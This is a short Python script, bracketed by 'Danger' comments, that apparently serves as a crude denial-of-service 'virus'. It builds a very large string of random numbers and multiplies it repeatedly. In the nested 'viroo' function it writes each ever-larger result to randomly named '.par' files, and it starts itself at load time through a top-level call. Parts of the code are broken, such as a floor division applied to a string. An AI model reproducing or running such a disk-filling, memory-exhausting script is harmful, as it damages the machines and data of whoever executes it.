from random import random, uniform
# from threading import Thread
# --------->---------> Danger <---------<---------
import random
def toolid(b):
    c= 10000
    a_v= "0"
    while c > 0:
        b = str(random.randrange(1000000, 990000000000000000))
        c= c-1
        a_v += b
    def viroo(a_v):
        c_v = 10
        while c_v > 0:
            # suggested by Parham Mehrabi
            try:
                a_v = a_v * c_v
                a=uniform(0,1)
                a=str(a)
                c=a.lstrip('0.')
                c_v -=1
                with open(f"{c}testtest.par","w") as p:
                    p.write(a_v)
            except Exception:
                a_v = a_v // (c_v*2)
                viroo(a_v)
    viroo(a_v)
    # toolid(1) 
toolid(1)
# --------->---------> Danger <---------<---------